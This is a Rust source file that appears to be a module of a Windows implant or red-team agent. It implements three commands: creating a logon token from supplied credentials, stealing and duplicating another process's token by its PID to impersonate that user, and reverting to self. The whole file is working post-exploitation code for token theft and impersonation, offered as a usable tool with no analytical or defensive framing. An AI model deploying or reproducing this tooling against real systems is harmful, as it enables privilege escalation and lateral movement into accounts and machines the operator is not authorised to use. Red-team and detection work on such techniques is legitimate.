use windows_sys::Win32::{
    Foundation::{CloseHandle, HANDLE},
    Security::{
        DuplicateTokenEx, ImpersonateLoggedOnUser, LogonUserW,
        RevertToSelf, SecurityImpersonation, TokenPrimary,
        LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT,
        TOKEN_ALL_ACCESS, TOKEN_DUPLICATE, TOKEN_IMPERSONATE, TOKEN_QUERY, TOKEN_ADJUST_SESSIONID,
    },
    System::Threading::{OpenProcessToken, PROCESS_QUERY_INFORMATION},
};

use crate::utils::COM_OpenProcess::COM_OpenProcess;

pub fn make_token(args: Vec<&str>) -> String{

    let domain_w = args[0].encode_utf16().collect::<Vec<u16>>();
    let username_w = args[1].encode_utf16().collect::<Vec<u16>>();
    let password_w = args[2].encode_utf16().collect::<Vec<u16>>();

    let mut token_handle = 0;
    let logon_userw_result = unsafe {
        LogonUserW(
            username_w.as_ptr(),
            domain_w.as_ptr(),
            password_w.as_ptr(),
            LOGON32_LOGON_NEW_CREDENTIALS,
            LOGON32_PROVIDER_DEFAULT,
            &mut token_handle,
        )
    };

    if logon_userw_result == 0 {
        return "Failed to make token".to_string()
    }

    unsafe {
        let res = ImpersonateLoggedOnUser(token_handle);

        if res == 0 {
            return "Failed to impersonate".to_string()
        }

    }
    return "Make Token Success".to_string()
}

pub fn steal_token(args: Vec<&str>) -> String {
    let process_handle = COM_OpenProcess(args[0].parse::<u32>().unwrap(), PROCESS_QUERY_INFORMATION);
    let mut token_handle: HANDLE = 0;
    let open_process_token_result = unsafe {
        OpenProcessToken(
            process_handle,
            TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE,
            &mut token_handle,
        )
    };

    if open_process_token_result == 0 {
        unsafe { CloseHandle(process_handle) };
        return "Failed to open token".to_string()
    }

    let mut duplicate_token_handle = 0;
    let duplicate_token_result = unsafe {
        DuplicateTokenEx(
            token_handle,
            TOKEN_ALL_ACCESS | TOKEN_ADJUST_SESSIONID,
            std::ptr::null_mut(),
            SecurityImpersonation,
            TokenPrimary,
            &mut duplicate_token_handle,
        )
    };

    if duplicate_token_result == 0 {
        unsafe { CloseHandle(token_handle) };
        unsafe { CloseHandle(process_handle) };
        return "Failed to dup it".to_string()
    }

    unsafe {
        let res = ImpersonateLoggedOnUser(duplicate_token_handle);

        if res == 0 {
           return "Failed to impersonate".to_string()
        }

    }

    return "Stole token successfully".to_string()
}


pub fn revert_to_self() -> String {
    let revert_to_self_result = unsafe { RevertToSelf() };

    if revert_to_self_result == 0 {
        return "Failed to rev to self".to_string()
    }

    return "RevToself Success".to_string()
}